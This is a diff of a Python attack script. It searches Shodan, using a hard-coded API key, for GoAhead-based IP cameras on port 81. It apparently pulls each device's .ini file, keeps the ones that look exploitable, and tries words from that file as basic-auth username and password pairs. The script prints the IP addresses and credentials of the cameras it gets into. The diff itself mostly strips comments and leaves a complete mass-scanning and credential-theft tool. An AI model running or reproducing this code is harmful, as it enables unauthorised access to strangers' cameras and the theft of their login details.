@@ -3,7 +3,6 @@ from requests import get
 from requests import session
 from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
-
 from collections import Counter
 from prettytable import PrettyTable
 
@@ -18,49 +17,26 @@ except:
  input("Something went wrong!")
  exit()
 
-# if os.getlogin() in mess:
-#   pass
-# else:
-#   print("This user is not registered.\n")
-#   inputi"Press Enter to exit.")
-#   exit()
-
 init(autoreset=True)
 
-# if os.path.exists(r'C:\Windows\Temp\te.config') == False:
-#  inn = input("Введите ключ API: ")
-#  if inn == '':
-#   exit()
-#  file = open(r'C:\Windows\Temp\te.config', 'w')
-#  file.write(inn)
-#  file.close()
-# else:
-#   #print('ok')
-#   pass
-
-# key = open(r'C:\Windows\Temp\te.config', 'r').read()
-key = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm' #9r6vVczYqYGR9F3WADASttMPt6fqK2Mm
+key = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm'
 
 api = shodan.Shodan(key)
 
 num_of_vulnerable = []
 locations = []
-ips = []#'220.126.32.138']
+ips = []
 
 def st():
 
  try:
   results = api.search('realm="GoAhead", domain=":81"')
  except shodan.exception.APIError:
-  #os.remove(r'C:\Windows\Temp\te.config')
   input('Wrong API key!\nRestart the program and enter the correct API.')
   exit()
-
- #ips.clear()
+  
  for result in results['matches']:
   ips.append(format(result['ip_str']))
-  # with open('assad.txt', 'a+') as e:
-  #   e.write(format(result['ip_str'])+'\n')
   ka = result['location']
   locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
 
@@ -75,10 +51,7 @@ def st():
 
    if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
     os.remove(f'camera_{ip}.ini')
-    #ips.remove(ip)
-    #print(ips)
     print(Fore.LIGHTRED_EX + 'Denied\n')
-    #input()
    else:
     num_of_vulnerable.append(ip)
     print(Fore.LIGHTGREEN_EX + 'Accessed\n')
@@ -94,29 +67,13 @@ else:
 
 print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
 
-
-
-
-
 th = ['IP', 'USERNAME', 'PASSWORD']
 td = []
 
-
-
-
-
-
 if len(num_of_vulnerable) >= int('1'):
  s = session()
-
-
- raz = 0
+ 
  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
-  #username = None
-  #password = None
-  #print(f'Username: {username}, password: {password}')
-  #asq = []
-
   for ipi in num_of_vulnerable:
    try:
     user = None
@@ -132,35 +89,16 @@ if len(num_of_vulnerable) >= int('1'):
     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
-      #print(f"Trying for {ipi}\nUsername: {words[i]}, pass: {words[i+1]}", end='')
-      #username = words[i]
-      #password = words[i+1]
       if page.status_code == 200:
-       #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
-       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
        td.append(ipi)
        td.append(words[i])
        td.append(words[i+1])
-       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
-       raz += 1
-       #print(asq)
        bar.next()
        break
-      #raz += 1
-      #tree.insert('', tk.END, values=(ipi, user, password))
      except Exception as e:
-      #print('Error: ', e)
       continue
    except:
     continue
- print('')
-
-# for d in asq:
-#  print(d)
-#  input("\nClick Enter to exit.")
-# else:
-#  input("No vulnerable devices was found!\nClick Enter to exit.")
-#input()
 
 if len(num_of_vulnerable) >= int('1'):
  columns = len(th)
@@ -171,6 +109,6 @@ if len(num_of_vulnerable) >= int('1'):
  while td_data:
     table.add_row(td_data[:columns])
     td_data = td_data[columns:]
- print(f'{table}\n')
+ print(f'\n{table}\n')
 else:
  print("No vulnerable devices was found!\n")
